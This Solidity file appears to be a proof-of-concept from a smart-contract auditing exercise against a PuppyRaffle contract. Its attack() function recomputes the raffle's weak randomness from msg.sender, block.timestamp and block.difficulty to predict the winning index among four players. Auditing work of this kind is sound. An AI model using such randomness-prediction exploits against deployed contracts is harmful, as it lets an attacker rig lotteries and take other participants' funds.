//SPDX-License-Identifier : MIT
pragma solidity 0.7.6;
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Randomness {
    PuppyRaffle public raffle;
    uint256 winnerIndex ;
    constructor (PuppyRaffle _raffle){
        raffle=_raffle;
    }
    function attack() public returns (uint256){
         winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % 4;
              return winnerIndex;
    }
    receive() external payable {}
}